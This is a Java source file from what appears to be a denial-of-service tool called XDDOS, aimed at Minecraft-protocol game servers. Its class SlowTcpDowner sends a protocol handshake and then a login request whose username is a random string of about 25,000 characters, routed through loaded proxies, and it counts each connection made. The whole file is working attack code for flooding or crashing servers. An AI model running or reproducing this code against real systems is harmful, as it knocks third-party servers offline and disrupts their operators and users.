package XD.XDDOS.methods.impl;

import java.io.IOException;
import java.security.SecureRandom;

import XD.XDDOS.XDDOS;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class SlowTcpDowner {

    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();
    String lol = "";
    SecureRandom r = new SecureRandom();

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        {
        for(int i = 1; i < 25556; ++i) {
            String var10001 = String.valueOf(this.lol);this.lol = var10001 + String.valueOf((char)(this.r.nextInt(125) + 1));}
         }
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

        try {
            bbbb.writeUTF(this.lol);
            bbbb.close();
        } catch (IOException var6) {
            var6.printStackTrace();
        }

        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(this.lol)).getWrappedPacket()));
        channel.write(b);
        channel.write(1);
        ++NettyBootstrap.integer;
        NettyBootstrap.totalConnections++;
        channel.close();
    }
  }

